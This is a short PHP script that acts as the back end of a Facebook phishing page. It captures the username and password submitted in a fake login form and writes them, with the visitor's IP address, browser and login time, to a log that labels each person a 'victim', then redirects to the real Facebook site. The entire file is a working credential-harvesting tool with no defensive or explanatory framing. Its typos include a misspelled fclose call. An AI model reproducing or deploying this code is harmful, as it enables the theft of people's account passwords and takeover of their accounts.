<?php
$date = date("Y/m/d");
$time = date("h:i:sa");
header('Location: https://www.facebook.com');
$fb_usern = $_POST['username'];
$fb_pass =  $_POST['password'] ;
$browser = $_SERVER['HTTP_USER_AGENT'];

$client_ip =  $_SERVER['HTTP_CLIENT_IP'];
$file = fopen("fb_thite_log.txt","a");
fwrite($file,"victiun ip :$client_ip \n");  
fwrite($file,"victum browse : $browser \nusername : $fb_usern \n");
fwrite($file,"password : $fb_pass \n");
fwrite($file,"login time : \n  date : $date \n  time : $time \n################################ \n");
fcolse($file);

?>
